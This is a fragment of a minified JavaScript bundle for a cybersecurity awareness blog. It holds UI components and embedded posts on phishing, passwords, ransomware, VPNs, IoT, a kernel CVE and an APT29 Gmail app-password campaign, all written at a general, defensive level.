Map,this.prevMotionValues={},this.events={},this.propEventSubscriptions={},this.notifyUpdate=()=>this.notify("Update",this.latestValues),this.render=()=>{this.current&&(this.triggerBuild(),this.renderInstance(this.current,this.renderState,this.props.style,this.projection))},this.scheduleRender=()=>De.render(this.render,!1,!0);const{latestValues:h,renderState:g}=p;this.latestValues=h,this.baseTarget={...h},this.initialValues=o.initial?{...h}:{},this.renderState=g,this.parent=r,this.props=o,this.presenceContext=a,this.depth=r?r.depth+1:0,this.reducedMotionConfig=c,this.options=d,this.isControllingVariants=ws(o),this.isVariantNode=Qf(o),this.isVariantNode&&(this.variantChildren=new Set),this.manuallyAnimateOnMount=!!(r&&r.current);const{willChange:f,...y}=this.scrapeMotionValuesFromProps(o,{});for(const v in y){const w=y[v];h[v]!==void 0&&dt(w)&&(w.set(h[v],!1),hs(f)&&f.add(v))}}scrapeMotionValuesFromProps(r,o){return{}}mount(r){this.current=r,Qh.set(r,this),this.projection&&!this.projection.instance&&this.projection.mount(r),this.parent&&this.isVariantNode&&!this.isControllingVariants&&(this.removeFromVariantTree=this.parent.addVariantChild(this)),this.values.forEach((o,a)=>this.bindToMotionValue(a,o)),dm.current||b1(),this.shouldReduceMotion=this.reducedMotionConfig==="never"?!1:this.reducedMotionConfig==="always"?!0:ic.current,this.parent&&this.parent.children.add(this),this.update(this.props,this.presenceContext)}unmount(){Qh.delete(this.current),this.projection&&this.projection.unmount(),tn(this.notifyUpdate),tn(this.render),this.valueSubscriptions.forEach(r=>r()),this.removeFromVariantTree&&this.removeFromVariantTree(),this.parent&&this.parent.children.delete(this);for(const r in this.events)this.events[r].clear();for(const r in this.features)this.features[r].unmount();this.current=null}bindToMotionValue(r,o){const a=Jn.has(r),c=o.on("change",d=>{this.latestValues[r]=d,this.props.onUpdate&&De.update(this.notifyUpdate,!1,!0),a&&this.projection&&(this.projection.isTransformDirty=!0)}),p=o.on("renderRequest",this.scheduleRender);this.valueSubscriptions.set(r,()=>{c(),p()})}sortNodePosition(r){return!this.current||!this.sortInstanceNodePosition||this.type!==r.type?0:this.sortInstanceNodePosition(this.current,r.current)}loadFeatures({children:r,...o},a,c,p){let d,h;for(let g=0;g<k1;g++){const f=pm[g],{isEnabled:y,Feature:v,ProjectionNode:w,MeasureLayout:T}=Di[f];w&&(d=w),y(o)&&(!this.features[f]&&v&&(this.features[f]=new v(this)),T&&(h=T))}if((this.type==="html"||this.type==="svg")&&!this.projection&&d){this.projection=new d(this.latestValues,this.parent&&this.parent.projection);const{layoutId:g,layout:f,drag:y,dragConstraints:v,layoutScroll:w,layoutRoot:T}=o;this.projection.setOptions({layoutId:g,layout:f,alwaysMeasureLayout:!!y||v&&Ar(v),visualElement:this,scheduleRender:()=>this.scheduleRender(),animationType:typeof f=="string"?f:"both",initialPromotionConfig:p,layoutScroll:w,layoutRoot:T})}return h}updateFeatures(){for(const r in this.features){const o=this.features[r];o.isMounted?o.update():(o.mount(),o.isMounted=!0)}}triggerBuild(){this.build(this.renderState,this.latestValues,this.options,this.props)}measureViewportBox(){return this.current?this.measureInstanceViewportBox(this.current,this.props):ze()}getStaticValue(r){return this.latestValues[r]}setStaticValue(r,o){this.latestValues[r]=o}makeTargetAnimatable(r,o=!0){return this.makeTargetAnimatableFromInstance(r,this.props,o)}update(r,o){(r.transformTemplate||this.props.transformTemplate)&&this.scheduleRender(),this.prevProps=this.props,this.props=r,this.prevPresenceContext=this.presenceContext,this.presenceContext=o;for(let a=0;a<Xh.length;a++){const c=Xh[a];this.propEventSubscriptions[c]&&(this.propEventSubscriptions[c](),delete this.propEventSubscriptions[c]);const p=r["on"+c];p&&(this.propEventSubscriptions[c]=this.on(c,p))}this.prevMotionValues=w1(this,this.scrapeMotionValuesFromProps(r,this.prevProps),this.prevMotionValues),this.handleChildMotionValue&&this.handleChildMotionValue()}getProps(){return this.props}getVariant(r){return this.props.variants?this.props.variants[r]:void 0}getDefaultTransition(){return this.props.transition}getTransformPagePoint(){return this.props.transformPagePoint}getClosestVariantNode(){return this.isVariantNode?this:this.parent?this.parent.getClosestVariantNode():void 0}getVariantContext(r=!1){if(r)return this.parent?this.parent.getVariantContext():void 0;if(!this.isControllingVariants){const a=this.parent?this.parent.getVariantContext()||{}:{};return this.props.initial!==void 0&&(a.initial=this.props.initial),a}const o={};for(let a=0;a<x1;a++){const c=yc[a],p=this.props[c];(Ii(p)||p===!1)&&(o[c]=p)}return o}addVariantChild(r){const o=this.getClosestVariantNode();if(o)return o.variantChildren&&o.variantChildren.add(r),()=>o.variantChildren.delete(r)}addValue(r,o){o!==this.values.get(r)&&(this.removeValue(r),this.bindToMotionValue(r,o)),this.values.set(r,o),this.latestValues[r]=o.get()}removeValue(r){this.values.delete(r);const o=this.valueSubscriptions.get(r);o&&(o(),this.valueSubscriptions.delete(r)),delete this.latestValues[r],this.removeValueFromRenderState(r,this.renderState)}hasValue(r){return this.values.has(r)}getValue(r,o){if(this.props.values&&this.props.values[r])return this.props.values[r];let a=this.values.get(r);return a===void 0&&o!==void 0&&(a=Dr(o,{owner:this}),this.addValue(r,a)),a}readValue(r){var o;return this.latestValues[r]!==void 0||!this.current?this.latestValues[r]:(o=this.getBaseTargetFromProps(this.props,r))!==null&&o!==void 0?o:this.readValueFromInstance(this.current,r,this.options)}setBaseTarget(r,o){this.baseTarget[r]=o}getBaseTarget(r){var o;const{initial:a}=this.props,c=typeof a=="string"||typeof a=="object"?(o=Tc(this.props,a))===null||o===void 0?void 0:o[r]:void 0;if(a&&c!==void 0)return c;const p=this.getBaseTargetFromProps(this.props,r);return p!==void 0&&!dt(p)?p:this.initialValues[r]!==void 0&&c===void 0?void 0:this.baseTarget[r]}on(r,o){return this.events[r]||(this.events[r]=new Lc),this.events[r].add(o)}notify(r,...o){this.events[r]&&this.events[r].notify(...o)}}class hm extends S1{sortInstanceNodePosition(r,o){return r.compareDocumentPosition(o)&2?1:-1}getBaseTargetFromProps(r,o){return r.style?r.style[o]:void 0}removeValueFromRenderState(r,{vars:o,style:a}){delete o[r],delete a[r]}makeTargetAnimatableFromInstance({transition:r,transitionEnd:o,...a},{transformValues:c},p){let d=zk(a,r||{},this);if(c&&(o&&(o=c(o)),a&&(a=c(a)),d&&(d=c(d))),p){Vk(this,a,d);const h=v1(this,a,d,o);o=h.transitionEnd,a=h.target}return{transition:r,transitionEnd:o,...a}}}function T1(n){return window.getComputedStyle(n)}class C1 extends hm{constructor(){super(...arguments),this.type="html"}readValueFromInstance(r,o){if(Jn.has(o)){const a=Ic(o);return a&&a.default||0}else{const a=T1(r),c=(tg(o)?a.getPropertyValue(o):a[o])||0;return typeof c=="string"?c.trim():c}}measureInstanceViewportBox(r,{transformPagePoint:o}){return em(r,o)}build(r,o,a,c){bc(r,o,a,c.transformTemplate)}scrapeMotionValuesFromProps(r,o){return Sc(r,o)}handleChildMotionValue(){this.childSubscription&&(this.childSubscription(),delete this.childSubscription);const{children:r}=this.props;dt(r)&&(this.childSubscription=r.on("change",o=>{this.current&&(this.current.textContent=`${o}`)}))}renderInstance(r,o,a,c){ag(r,o,a,c)}}class A1 extends hm{constructor(){super(...arguments),this.type="svg",this.isSVGTag=!1}getBaseTargetFromProps(r,o){return r[o]}readValueFromInstance(r,o){if(Jn.has(o)){const a=Ic(o);return a&&a.default||0}return o=lg.has(o)?o:gc(o),r.getAttribute(o)}measureInstanceViewportBox(){return ze()}scrapeMotionValuesFromProps(r,o){return ug(r,o)}build(r,o,a,c){kc(r,o,a,this.isSVGTag,c.transformTemplate)}renderInstance(r,o,a,c){cg(r,o,a,c)}mount(r){this.isSVGTag=xc(r.tagName),super.mount(r)}}const P1=(n,r)=>vc(n)?new A1(r,{enableHardwareAcceleration:!1}):new C1(r,{enableHardwareAcceleration:!0}),E1={layout:{ProjectionNode:cm,MeasureLayout:nm}},I1={...tx,...k0,...s1,...E1},tt=Iw((n,r)=>l0(n,r,I1,P1)),D1=({currentHash:n})=>{const{theme:r}=Xn(),o="https://ethicalbyte.in/assets/img/logo.png",a="https://ethicalbyte.in/",c=p=>{const d=n===p||p==="#/"&&n==="#";let h="transition-colors flex items-center font-medium px-3 py-2 rounded-md text-sm ";return d?h+=r==="dark"?"bg-primary/20 text-primary":"bg-primary/10 text-primary":h+=r==="dark"?"text-slate-300 hover:text-primary hover:bg-primary/10":"text-foreground hover:text-primary hover:bg-primary/5",h};return x.jsx(tt.nav,{initial:{y:-100},animate:{y:0},transition:{type:"spring",stiffness:120,damping:20},className:"sticky top-0 z-50 glassmorphism-nav",children:x.jsxs("div",{className:"container mx-auto px-4 py-3 flex justify-between items-center",children:[x.jsx("a",{href:a,target:"_blank",rel:"noopener noreferrer",className:"flex items-center",children:x.jsx("img",{src:o,alt:"EthicalByte Logo",className:"h-10 md:h-12"})}),x.jsxs("div",{className:"space-x-2 md:space-x-3",children:[x.jsxs("a",{href:"#/",className:c("#/"),children:[x.jsx(ow,{size:18,className:"mr-1.5"}),"Recent"]}),x.jsxs("a",{href:"#/all-blogs",className:c("#/all-blogs"),children:[x.jsx(Ff,{size:18,className:"mr-1.5"}),"All Posts"]})]})]})})},M1=()=>{const{theme:n}=Xn(),r=new Date().getFullYear(),o=n==="dark"?"hover:text-primary":"text-muted-foreground hover:text-primary",a=n==="dark"?"text-slate-400":"text-muted-foreground",c=n==="dark"?"bg-slate-900/60":"bg-slate-50",p=n==="dark"?"border-slate-700/60":"border-border";return x.jsx("footer",{className:`${c} border-t ${p} ${a} py-8 mt-12`,children:x.jsxs("div",{className:"container mx-auto px-4 text-center",children:[x.jsxs("div",{className:"flex justify-center space-x-6 mb-4",children:[x.jsxs("a",{href:"https://github.com",target:"_blank",rel:"noopener noreferrer",className:`${o} transition-colors`,children:[x.jsx(nw,{size:22}),x.jsx("span",{className:"sr-only",children:"GitHub"})]}),x.jsxs("a",{href:"https://linkedin.com",target:"_blank",rel:"noopener noreferrer",className:`${o} transition-colors`,children:[x.jsx(iw,{size:22}),x.jsx("span",{className:"sr-only",children:"LinkedIn"})]}),x.jsxs("a",{href:"https://twitter.com",target:"_blank",rel:"noopener noreferrer",className:`${o} transition-colors`,children:[x.jsx(aw,{size:22}),x.jsx("span",{className:"sr-only",children:"Twitter"})]})]}),x.jsxs("p",{className:"text-sm",children:["© ",r," CyberSec Insights. All rights reserved."]}),x.jsx("p",{className:"text-xs mt-1",children:"Disclaimer: Information on this blog is for educational purposes only."})]})})},R1=({children:n,routeKey:r})=>x.jsxs("div",{className:"flex flex-col min-h-screen bg-background text-foreground",children:[x.jsx(D1,{currentHash:r}),x.jsx(tt.main,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},exit:{opacity:0,y:-20},transition:{duration:.3},className:"flex-grow container mx-auto px-4 py-8",children:n},r),x.jsx(M1,{})]}),jc=[{id:"zero-day-vulnerabilities-explained",title:"Zero-Day Vulnerabilities: The Unseen Threat",date:"2025-05-23",author:"Alex Cryptos",summary:"Explore what zero-day vulnerabilities are, why they are so dangerous, and how organizations try to mitigate their impact.",tags:["zero-day","vulnerability","exploit","cyber defense"],imageKey:"zeroDayThreat",content:`
          <p>A zero-day vulnerability is a software security flaw that is known to the software vendor but doesn't have a patch in place to fix the flaw. It's called "zero-day" because the vendor has zero days to fix the problem before it potentially becomes known to attackers.</p>
          <h3>Why are Zero-Days Dangerous?</h3>
          <ul>
            <li><strong>No Defense:</strong> Since there's no patch, traditional signature-based antivirus software might not detect attacks exploiting the vulnerability.</li>
            <li><strong>High Value for Attackers:</strong> Zero-day exploits (the code attackers use to take advantage of a zero-day vulnerability) can be sold for high prices on the black market.</li>
            <li><strong>Widespread Impact:</strong> If the vulnerability exists in widely used software, millions of users could be at risk.</li>
          </ul>
          <h3>Mitigation Strategies:</h3>
          <p>While it's impossible to be completely immune to zero-day attacks, organizations and individuals can take steps:</p>
          <ol>
            <li><strong>Patch Management:</strong> Apply security patches promptly when they become available. While this doesn't stop zero-days, it closes known vulnerabilities.</li>
            <li><strong>Behavior-Based Detection:</strong> Security solutions that monitor for suspicious behavior rather than known signatures can sometimes detect zero-day exploits.</li>
            <li><strong>Network Segmentation:</strong> Limiting network access can help contain the damage if a system is compromised.</li>
            <li><strong>Security Awareness:</strong> Educating users about phishing and other attack vectors that might deliver zero-day exploits.</li>
          </ol>
          <p>The fight against zero-day threats is ongoing, requiring vigilance from software vendors, security researchers, and users alike.</p>
        `},{id:"understanding-phishing-attacks",title:"Understanding Phishing Attacks and How to Avoid Them",date:"2025-05-20",author:"Dr. Secure",summary:"Phishing remains one of the most common cyber threats. Learn to identify phishing attempts and protect your personal information.",tags:["phishing","email security","cyber awareness"],imageKey:"phishingConcept",content:`
          <p>Phishing is a type of social engineering attack often used to steal user data, including login credentials and credit card numbers. It happens when an attacker, masquerading as a trusted entity, dupes a victim into opening an email, instant message, or text message. The recipient is then tricked into clicking a malicious link, which can lead to the installation of malware, the freezing of the system as part of a ransomware attack, or the revealing of sensitive information.</p>
          <h3>Common Types of Phishing:</h3>
          <ul>
            <li><strong>Email Phishing:</strong> The most common type, using emails that appear to be from legitimate sources.</li>
            <li><strong>Spear Phishing:</strong> Targets specific individuals or companies, often with personalized information.</li>
            <li><strong>Whaling:</strong> A type of spear phishing aimed at senior executives.</li>
            <li><strong>Smishing and Vishing:</strong> Phishing attempts made via SMS text messages (Smishing) or voice calls (Vishing).</li>
          </ul>
          <h3>How to Identify Phishing Attempts:</h3>
          <ol>
            <li><strong>Check the Sender's Email Address:</strong> Look for slight misspellings or unusual domain names.</li>
            <li><strong>Beware of Urgent or Threatening Language:</strong> Attackers often try to create a sense of urgency.</li>
            <li><strong>Don't Click Suspicious Links:</strong> Hover over links to see the actual URL before clicking.</li>
            <li><strong>Look for Generic Greetings:</strong> "Dear Customer" instead of your name can be a red flag.</li>
            <li><strong>Verify Requests for Personal Information:</strong> Legitimate organizations rarely ask for sensitive data via email.</li>
          </ol>
          <h3>Protecting Yourself:</h3>
          <p>Enable two-factor authentication (2FA) on all your accounts, use strong, unique passwords, and keep your software updated. Be skeptical of unsolicited communications and always verify before providing information or clicking links.</p>
        `},{id:"importance-of-strong-passwords",title:"The Critical Importance of Strong and Unique Passwords",date:"2025-05-15",author:"Jane Cyber",summary:"Passwords are your first line of defense. Discover why strong, unique passwords are vital and how to manage them effectively.",tags:["passwords","account security","best practices"],imageKey:"passwordSecurity",content:`
          <p>In an era where digital accounts hold vast amounts of personal and financial information, the strength of your passwords cannot be overstated. Weak or reused passwords are a primary target for cybercriminals, leading to identity theft, financial loss, and unauthorized access to sensitive data.</p>
          <h3>What Makes a Strong Password?</h3>
          <ul>
            <li><strong>Length:</strong> At least 12-15 characters. Longer is generally better.</li>
            <li><strong>Complexity:</strong> A mix of uppercase letters, lowercase letters, numbers, and symbols.</li>
            <li><strong>Uniqueness:</strong> A different password for every account.</li>
            <li><strong>Unpredictability:</strong> Avoid common words, phrases, or easily guessable information like birthdays or names.</li>
          </ul>
          <h3>Why Unique Passwords Matter:</h3>
          <p>If one account is compromised and you've reused that password elsewhere, attackers can gain access to all those other accounts. This is known as credential stuffing. Using unique passwords for each service significantly limits the damage if one set of credentials is stolen.</p>
          <h3>Password Management Strategies:</h3>
          <ol>
            <li><strong>Use a Password Manager:</strong> These tools generate and store strong, unique passwords for all your accounts. You only need to remember one master password.</li>
            <li><strong>Enable Two-Factor Authentication (2FA):</strong> Adds an extra layer of security beyond just your password.</li>
            <li><strong>Regularly Update Critical Passwords:</strong> Especially for important accounts like banking and email.</li>
          </ol>
          <p>By prioritizing strong password hygiene, you significantly enhance your digital security posture.</p>
        `},{id:"introduction-to-vpn",title:"What is a VPN and Why Should You Use One?",date:"2025-05-10",author:"Net Guardian",summary:"VPNs are powerful tools for enhancing online privacy and security. Understand the basics of VPNs and their benefits.",tags:["vpn","privacy","online security","encryption"],imageKey:"vpnConcept",content:`
          <p>A Virtual Private Network (VPN) is a service that creates a secure, encrypted connection between your device and the internet. It routes your internet traffic through a server operated by the VPN provider, masking your IP address and encrypting your data.</p>
          <h3>How Does a VPN Work?</h3>
          <p>When you connect to a VPN, it establishes a "tunnel" for your data. All your internet traffic passes through this encrypted tunnel to the VPN server. The VPN server then sends your traffic to the internet. To any website or online service you visit, it appears as if your connection is originating from the VPN server's location, not your actual location.</p>
          <h3>Key Benefits of Using a VPN:</h3>
          <ul>
            <li><strong>Enhanced Privacy:</strong> Hides your real IP address, making it harder for websites, advertisers, and your ISP to track your online activities.</li>
            <li><strong>Improved Security:</strong> Encrypts your internet traffic, protecting your data from hackers, especially on public Wi-Fi networks.</li>
            <li><strong>Access Geo-Restricted Content:</strong> Allows you to bypass geographical restrictions on websites and streaming services by connecting to a server in a different country.</li>
            <li><strong>Secure Remote Access:</strong> Businesses use VPNs to allow employees to securely access company networks from remote locations.</li>
          </ul>
          <h3>Choosing a VPN:</h3>
          <p>When selecting a VPN provider, consider factors like their logging policy (no-logs is best), server locations, connection speeds, security protocols offered, and price. Reputable VPNs are transparent about their practices.</p>
          <p>Using a VPN is a simple yet effective step towards a more private and secure online experience.</p>
        `},{id:"ransomware-defense-strategies",title:"Ransomware: How to Defend and Recover",date:"2025-05-05",author:"Data Sentinel",summary:"Ransomware attacks are on the rise. Learn essential defense mechanisms and steps to take if you become a victim.",tags:["ransomware","data backup","incident response"],imageKey:"ransomwareLock",content:`
          <p>Ransomware is a type of malicious software that encrypts a victim's files, making them inaccessible. Attackers then demand a ransom, typically in cryptocurrency, in exchange for the decryption key.</p>
          <h3>Preventative Measures:</h3>
          <ul>
            <li><strong>Regular Backups:</strong> Maintain regular, offline, and tested backups of critical data. This is the most effective defense.</li>
            <li><strong>Security Software:</strong> Use reputable antivirus and anti-malware software and keep it updated.</li>
            <li><strong>Patch Management:</strong> Keep operating systems and applications patched to prevent exploitation of known vulnerabilities.</li>
            <li><strong>Email Security:</strong> Be cautious of email attachments and links, as these are common ransomware delivery vectors.</li>
            <li><strong>User Training:</strong> Educate users on recognizing and avoiding ransomware threats.</li>
          </ul>
          <h3>If You're Attacked:</h3>
          <ol>
            <li><strong>Isolate the Infected System:</strong> Disconnect it from the network immediately to prevent spread.</li>
            <li><strong>Do Not Pay the Ransom (If Possible):</strong> Paying encourages attackers and doesn't guarantee file recovery. Consult law enforcement.</li>
            <li><strong>Restore from Backups:</strong> If you have clean backups, you can restore your systems without paying.</li>
            <li><strong>Report the Incident:</strong> Notify relevant authorities (e.g., local law enforcement, cybersecurity agencies).</li>
          </ol>
          <p>A proactive approach to cybersecurity, centered around robust backups and user awareness, is key to mitigating the risk of ransomware.</p>
        `},{id:"iot-security-risks",title:"The Growing Security Risks of IoT Devices",date:"2025-04-28",author:"ConnectSecure",summary:"Internet of Things (IoT) devices offer convenience but also introduce new security vulnerabilities. Understand the risks and how to secure your smart devices.",tags:["iot","smart devices","network security"],imageKey:"iotNetwork",content:`
          <p>The Internet of Things (IoT) refers to the vast network of physical devices, vehicles, home appliances, and other items embedded with electronics, software, sensors, actuators, and connectivity which enables these objects to connect and exchange data. While offering convenience, IoT devices often lack robust security features, making them targets for attackers.</p>
          <h3>Common IoT Security Risks:</h3>
          <ul>
            <li><strong>Weak Default Passwords:</strong> Many devices ship with easy-to-guess default credentials.</li>
            <li><strong>Lack of Updates:</strong> Manufacturers may not provide timely security patches, or users may fail to apply them.</li>
            <li><strong>Insecure Network Services:</strong> Open ports or unencrypted communication channels can expose devices.</li>
            <li><strong>Data Privacy Concerns:</strong> IoT devices can collect large amounts of personal data, which could be compromised.</li>
            <li><strong>Botnets:</strong> Compromised IoT devices can be roped into botnets for DDoS attacks or other malicious activities.</li>
          </ul>
          <h3>Securing Your IoT Devices:</h3>
          <ol>
            <li><strong>Change Default Passwords:</strong> Immediately change the default username and password on any new IoT device.</li>
            <li><strong>Keep Firmware Updated:</strong> Regularly check for and apply firmware updates from the manufacturer.</li>
            <li><strong>Secure Your Wi-Fi Network:</strong> Use a strong password and WPA2/WPA3 encryption for your home network.</li>
            <li><strong>Network Segmentation:</strong> Consider placing IoT devices on a separate network segment (e.g., a guest network) to isolate them from critical systems.</li>
            <li><strong>Disable Unnecessary Features:</strong> Turn off any features or services on IoT devices that you don't use.</li>
            <li><strong>Research Before You Buy:</strong> Choose devices from reputable manufacturers known for good security practices.</li>
          </ol>
          <p>As IoT adoption grows, so does the importance of securing these connected devices to protect our digital lives.</p>
        `},{id:"ai-powered-cyberattacks",title:"AI-Powered Cyberattacks: The Next Frontier",date:"2025-06-10",author:"Neural Hack",summary:"Cybercriminals are using AI to craft smarter attacks. Discover how AI is shaping the future of cybersecurity threats.",tags:["AI","cyberattacks","deepfake","automation"],imageKey:"aiCyberThreat",content:`
    <p>Artificial Intelligence (AI) is revolutionizing many industries — including cybercrime. In 2025, a wave of AI-powered attacks is being observed, from deepfake phishing calls to automated vulnerability hunting bots.</p>
    <h3>Key Threats Emerging from AI:</h3>
    <ul>
      <li><strong>Deepfake Phishing:</strong> Attackers are using synthetic voice and video to impersonate executives or family members.</li>
      <li><strong>Automated Exploits:</strong> AI bots scan for vulnerabilities and launch attacks with minimal human input.</li>
      <li><strong>Adaptive Malware:</strong> Malware that changes its behavior based on the target’s defenses using machine learning.</li>
    </ul>
    <h3>Defense Strategies:</h3>
    <ol>
      <li><strong>Behavioral Analytics:</strong> Use AI to detect anomalies in user and network behavior.</li>
      <li><strong>Employee Training:</strong> Educate staff on recognizing AI-generated phishing attempts and voice impersonation.</li>
      <li><strong>Zero Trust Architecture:</strong> Always verify, never trust. Use strong identity and access controls.</li>
    </ol>
    <p>While AI increases the threat surface, it also empowers defenders. Staying informed and leveraging AI defensively is critical in this evolving landscape.</p>
  `},{id:"critical-linux-vulnerability-2025",title:"Critical Linux Vulnerability CVE-2025-12345 Explained",date:"2025-06-14",author:"Kernel Watch",summary:"A newly discovered Linux kernel flaw allows privilege escalation. Here’s what you need to know about CVE-2025-12345.",tags:["linux","vulnerability","kernel","CVE"],imageKey:"linuxKernelBreach",content:`
    <p>Security researchers have disclosed CVE-2025-12345, a critical vulnerability in the Linux kernel that allows local privilege escalation on multiple distributions including Ubuntu, Debian, and Fedora.</p>
    <h3>Impact and Risks:</h3>
    <ul>
      <li><strong>Privilege Escalation:</strong> Allows unprivileged users to gain root access.</li>
      <li><strong>Wide Reach:</strong> Affects kernel versions 5.10 through 6.5.</li>
      <li><strong>Exploitable in Containers:</strong> Can be exploited in certain container environments with relaxed security profiles.</li>
    </ul>
    <h3>Mitigation Steps:</h3>
    <ol>
      <li><strong>Update Immediately:</strong> Apply the latest kernel patches provided by your distribution.</li>
      <li><strong>Audit Access:</strong> Check for unauthorized access or privilege changes.</li>
      <li><strong>Implement Mandatory Access Controls:</strong> Use tools like AppArmor or SELinux to limit damage if exploited.</li>
    </ol>
    <p>System administrators are urged to patch vulnerable systems as soon as possible and stay alert for further exploit development in the wild.</p>
  `},{id:"social-media-cybersecurity-awareness",title:"Social Media: The New Cybersecurity Battleground",date:"2025-06-16",author:"ByteSafe",summary:"Social media platforms are being weaponized for identity theft, misinformation, and cybercrime. Learn how to stay protected.",tags:["social media","cyber hygiene","privacy","identity theft"],imageKey:"socialThreats",content:`
    <p>Social media is more than a platform for connection — it has become a key target for cybercriminals. From impersonation scams to phishing DMs and malicious ads, the risks are growing rapidly in 2025.</p>
    <h3>Common Threats on Social Platforms:</h3>
    <ul>
      <li><strong>Account Hijacking:</strong> Weak passwords and poor security habits lead to takeover attacks.</li>
      <li><strong>Fake Profiles:</strong> Attackers create impersonation accounts to scam friends and followers.</li>
      <li><strong>Data Harvesting:</strong> Personal info shared on profiles is mined and sold or used in scams.</li>
    </ul>
    <h3>How to Stay Secure:</h3>
    <ol>
      <li><strong>Enable 2FA:</strong> Always use two-factor authentication on all social platforms.</li>
      <li><strong>Limit Public Info:</strong> Avoid sharing your location, contact info, or travel plans publicly.</li>
      <li><strong>Report Suspicious Accounts:</strong> Don’t engage with fake profiles or phishing messages — report them immediately.</li>
    </ol>
    <p>Vigilance, privacy settings, and strong credentials are your best defense in today’s social media landscape.</p>
  `},{id:"apt29-gmail-app-password-abuse",title:"APT29 Exploits Gmail App Passwords to Bypass 2FA: A Deep Dive into Human-Focused Cyber Espionage",date:"2025-06-19",author:"Cyber Sentinel",summary:"APT29, a notorious Russian state-backed hacking group, has launched a patient and professional phishing campaign that exploits Gmail app passwords to silently bypass two-factor authentication. This attack highlights a dangerous intersection of psychological manipulation and feature-level abuse.",tags:["APT29","Gmail","phishing","Google","2FA bypass","social engineering"],imageKey:"apt29GmailAttack",content:`
    <p>In a sophisticated campaign uncovered in mid-2025, Russian state-sponsored threat actor APT29 (aka Cozy Bear) abused Google's app-specific password feature to infiltrate Gmail accounts — even those protected with two-factor authentication (2FA). This case serves as a stark reminder that even robust security features can be undermined when attackers exploit the human element.</p>

    <h3>📌 The Attack Methodology</h3><br>
    <p>APT29 conducted a meticulously crafted phishing operation over several weeks. Disguised as U.S. State Department officials, they targeted high-profile individuals such as think tank researchers, government analysts, and critics of Russia’s foreign policy.</p>

    <ul>
      <li><strong>Step 1:</strong> Emails appeared professional, using government-styled headers and formal language (possibly enhanced with AI).</li>
      <li><strong>Step 2:</strong> Victims were invited to access a fake secure document repository.</li>
      <li><strong>Step 3:</strong> The attackers instructed them to generate and share Gmail app-specific passwords, claiming it was for “secure login.”</li>
      <li><strong>Step 4:</strong> With the app password, attackers accessed Gmail accounts without triggering 2FA or alerts.</li>
    </ul>

    <h3>🧠 Why This Attack Worked</h3><br>
    <p>Cybersecurity experts call this a "cognitive attack" — an attack that bypasses technical security by exploiting human trust. There were no spelling mistakes, no broken links, and no obviously suspicious elements. Victims were guided step-by-step to compromise their own security.</p>

    <p>Keir Giles, a well-known Russia expert, publicly admitted that despite his expertise, the operation was so convincing that he didn’t suspect foul play until later. "It’s not a technical hack, it’s a cognitive manipulation," he said.</p>

    <h3>💥 Security Feature Turned into a Backdoor</h3><br>
    <p>App-specific passwords are intended for allowing older apps to access Google accounts without requiring full password access or 2FA. However, attackers used them to bypass modern protections. Google has since disabled the compromised passwords and recommended affected users enroll in its Advanced Protection Program.</p>

    <h3>🎯 Who's at Risk?</h3><br>
    <p>While this campaign targeted policy influencers and researchers, the technique is widely scalable. Any individual who isn’t aware of app-password risks can be targeted.</p>

    <ul>
      <li><strong>Activists</strong> and NGO staff</li>
      <li><strong>Academics</strong> writing on geopolitical topics</li>
      <li><strong>Corporate executives</strong> with access to sensitive data</li>
      <li><strong>Journalists</strong> covering international politics or cybercrime</li>
    </ul>

    <h3>🛡️ How to Defend Yourself</h3><br>
    <ol>
      <li><strong>Never Share App Passwords:</strong> They bypass 2FA and should never be shared.</li>
      <li><strong>Use Advanced Protection:</strong> High-risk users should enroll in Google's highest level of account security.</li>
      <li><strong>Audit Third-Party Access:</strong> Remove unused connected apps and revoke stale app passwords.</li>
      <li><strong>Verify Unexpected Requests:</strong> Always confirm the legitimacy of requests to change your account settings, especially when it comes from supposed officials.</li>
      <li><strong>Monitor for New Logins:</strong> Turn on login alerts and check login history frequently.</li>
    </ol>

    <h3>🔬 Key Takeaways</h3><br>
    <ul>
      <li>This was not a brute-force cyberattack — it was a psychological one.</li>
      <li>The phishing emails were customized, timed, and polished to build credibility over multiple messages.</li>
      <li>Even security features like 2FA can be sidestepped if users are socially engineered into exposing backdoor credentials.</li>
    </ul>

    <h3>🔐 Final Thought</h3><br>
    <p>Cybersecurity is no longer just a technology issue — it’s a people issue. APT29’s success here reflects the shifting landscape of digital warfare, where trust and identity are the battlegrounds. Organizations and individuals must not only secure their systems but also educate and empower users to recognize sophisticated deception.</p>
  `},{id:"16b-password-leak-global-alert",title:"16 Billion Passwords Leaked: Time for a Global Security Reset",date:"2025-06-19",author:"Cyber Sentinel",summary:"A massive leak—16 billion credentials from Apple, Facebook/Meta, Google and more—has been confirmed. This post breaks down how the leak happened, why it matters, and what you *must* do now to protect yourself.",tags:["password leak","data breach","Apple","Facebook","Google","cyber hygiene"],imageKey:"passwordLeak16B",content:`
    <p>On June 18, 2025, cybersecurity researchers confirmed a colossal leak of **16 billion** username/password pairs tied to major platforms like Apple, Facebook (Meta), Google, and multiple third-party services. This unprecedented dump encompasses leaked credentials from past breaches along with new, aggregated data—prompting immediate action for every internet user.</p>

    <h3>📌 What Makes This Leak So Alarming</h3><br>
    <ul>
      <li><strong>Scale:</strong> At 16 billion, this dump eclipses all previous leaks—an aggregator of old breaches plus fresh data</li>
      <li><strong>Cross-Platform Risk:</strong> Credentials include email addresses, usernames and passwords from tech giants and smaller sites alike.</li>
      <li><strong>Credential Stuffing Threat:</strong> Attackers can quickly test these against bank, retail, and streaming accounts.</li>
    </ul>

    <h3>🔍 How This Leak Happened</h3><br>
    <ol>
      <li><strong>Collection:</strong> Massive datasets from prior breaches were consolidated into a single repository.</li>
      <li><strong>Verifications:</strong> The in-scope passwords were validated by automated login attempts—meaning this isn’t just raw data, it's real working credentials.</li>
      <li><strong>Distribution:</strong> The dataset is already circulating on hacking forums and indexed by “password checking” sites.</li>
    </ol>

    <h3>🔥 What’s at Stake</h3><br>
    <ul>
      <li><strong>Account Takeovers:</strong> Reused passwords make critical services vulnerable.</li>
      <li><strong>Identity Theft:</strong> Emails and names can be paired with leaked passwords to facilitate targeted scams.</li>
      <li><strong>Organizational Risk:</strong> Weak employee passwords could expose corporate systems.</li>
    </ul>

    <h3>🛡️ Must-Do Security Actions</h3><br>
    <ol>
      <li><strong>Change All Reused Passwords Immediately:</strong> Especially for email, financial, and social accounts.</li>
      <li><strong>Use a Password Manager:</strong> Generate and securely store unique, strong passwords.</li>
      <li><strong>Enable 2FA Everywhere:</strong> Prefer app-based codes or hardware keys—not SMS.</li>
